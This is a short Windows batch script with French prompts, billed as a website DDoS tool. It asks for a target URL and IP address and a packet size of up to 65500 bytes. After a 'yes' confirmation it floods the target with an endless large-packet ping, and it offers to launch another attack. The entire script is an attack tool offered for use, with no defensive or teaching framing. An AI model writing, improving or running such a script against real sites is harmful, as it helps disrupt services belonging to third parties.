@echo off
:loading
cls
color 0a
:loading 
set /p url=Quelle est l'url du site a DDOS ? :
nslookup "%url%"
pause
set /p ip=Quelle est l'adresse ip du site à DDOS ? :
set /p nboctets=Combien de paquets d'octets voulez vous envoyer (max 65500) ? :
set /p attackconfirmation=Voulez vous vraiment DDOS ce site ?(si oui tapez "yes" sinon tapez "no") :

if /I "%attackconfirmation%"=="yes" (goto :fire)
if /I "%attackconfirmation%"=="no" (goto :annulation)

:fire
echo L'attaque a ete lance avec succes
ping "%ip%" -t -l "%nboctets%"
pause
goto :link

:annulation
echo L'attaque a ete annule avec succes
pause
:link
set /p reload=Voulez vous recommencer une attaque?(si oui tapez "yes" sinon tapez "no") :

if /I "%reload%"=="yes" (goto :loading)
if /I "%reload%"=="no" (goto :exit)

:exit
